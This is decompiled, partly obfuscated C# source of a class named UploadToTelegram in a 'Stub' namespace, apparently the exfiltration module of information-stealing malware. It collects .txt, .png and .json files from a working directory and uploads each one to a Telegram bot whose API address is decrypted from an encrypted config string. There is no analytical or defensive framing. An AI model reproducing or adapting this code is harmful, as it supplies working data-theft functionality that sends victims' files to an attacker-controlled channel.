using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x020000D0 RID: 208
	internal sealed class UploadToTelegram
	{
		// Token: 0x06000317 RID: 791 RVA: 0x0001D050 File Offset: 0x0001B250
		public static async Task<List<string>> UploadMultipleFilesAsync(string[] fileExtensions = null)
		{
			List<string> responses = new List<string>();
			if (fileExtensions == null)
			{
				fileExtensions = new string[] { ".txt", ".png", ".json" };
			}
			string workDir = Paths.InitWorkDir();
			string[] files = (from f in Directory.GetFiles(workDir)
				where fileExtensions.Contains(Path.GetExtension(f).ToLower())
				select f).ToArray<string>();
			List<string> list;
			if (files.Length == 0)
			{
				responses.Add("No files found with specified extensions.");
				list = responses;
			}
			else
			{
				using (HttpClient client = new HttpClient())
				{
					string endpoint = UploadToTelegram.TelegramBotAPI + Config.TelegramAPI + "/sendDocument?chat_id=" + Config.TelegramID;
					foreach (string file in files)
					{
						try
						{
							byte[] file_bytes = File.ReadAllBytes(file);
							MultipartFormDataContent content = new MultipartFormDataContent();
							content.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "document", Path.GetFileName(file));
							ConfiguredTaskAwaitable<HttpResponseMessage>.ConfiguredTaskAwaiter configuredTaskAwaiter = client.PostAsync(endpoint, content).ConfigureAwait(false).GetAwaiter();
							if (!configuredTaskAwaiter.IsCompleted)
							{
								await configuredTaskAwaiter;
								ConfiguredTaskAwaitable<HttpResponseMessage>.ConfiguredTaskAwaiter configuredTaskAwaiter2;
								configuredTaskAwaiter = configuredTaskAwaiter2;
								configuredTaskAwaiter2 = default(ConfiguredTaskAwaitable<HttpResponseMessage>.ConfiguredTaskAwaiter);
							}
							HttpResponseMessage httpResponseMessage = configuredTaskAwaiter.GetResult();
							HttpResponseMessage response = httpResponseMessage;
							httpResponseMessage = null;
							response.EnsureSuccessStatusCode();
							ConfiguredTaskAwaitable<string>.ConfiguredTaskAwaiter configuredTaskAwaiter3 = response.Content.ReadAsStringAsync().ConfigureAwait(false).GetAwaiter();
							if (!configuredTaskAwaiter3.IsCompleted)
							{
								await configuredTaskAwaiter3;
								ConfiguredTaskAwaitable<string>.ConfiguredTaskAwaiter configuredTaskAwaiter4;
								configuredTaskAwaiter3 = configuredTaskAwaiter4;
								configuredTaskAwaiter4 = default(ConfiguredTaskAwaitable<string>.ConfiguredTaskAwaiter);
							}
							string text = configuredTaskAwaiter3.GetResult();
							string responseBody = text;
							text = null;
							responses.Add(Path.GetFileName(file) + ": " + responseBody);
							file_bytes = null;
							content = null;
							response = null;
							responseBody = null;
							goto IL_0346;
						}
						catch (Exception ex)
						{
							responses.Add(Path.GetFileName(file) + ": Failed - " + ex.Message);
							goto IL_0346;
						}
						continue;
						IL_0346:
						file = null;
					}
					string[] array = null;
					endpoint = null;
				}
				HttpClient client = null;
				list = responses;
			}
			return list;
		}

		// Token: 0x06000318 RID: 792 RVA: 0x000038B4 File Offset: 0x00001AB4
		public UploadToTelegram()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x06000319 RID: 793 RVA: 0x000041C3 File Offset: 0x000023C3
		static UploadToTelegram()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			UploadToTelegram.TelegramBotAPI = StringsCrypt.DecryptConfig("ENCRYPTED:BncRbgTGet4L+mKqD8dz7h8EdEcrI2Pbm5InYO5Ff/I=");
		}

		// Token: 0x0400060E RID: 1550
		private static string TelegramBotAPI;
	}
}
